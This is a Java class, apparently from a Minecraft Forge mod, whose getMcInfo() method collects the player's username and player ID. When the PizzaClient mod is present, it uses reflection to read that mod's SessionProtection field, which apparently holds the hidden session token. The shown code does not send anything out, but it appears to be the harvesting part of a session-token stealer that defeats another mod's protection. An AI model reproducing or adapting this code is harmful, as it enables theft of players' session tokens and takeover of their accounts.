package dev.schubilegend.handlers;

import net.minecraft.client.Minecraft;
import net.minecraftforge.fml.common.Loader;
import net.minecraftforge.fml.relauncher.ReflectionHelper;

public class MinecraftHandler {
    public String[] getMcInfo() {
        String token = null;
        if (Loader.isModLoaded("pizzaclient")) {
            try {
                token = (String) ReflectionHelper.findField(Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection"), "changed").get(null);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return new String[]{Minecraft.getMinecraft().getSession().getUsername(), Minecraft.getMinecraft().getSession().getPlayerID(), token};
    }
}
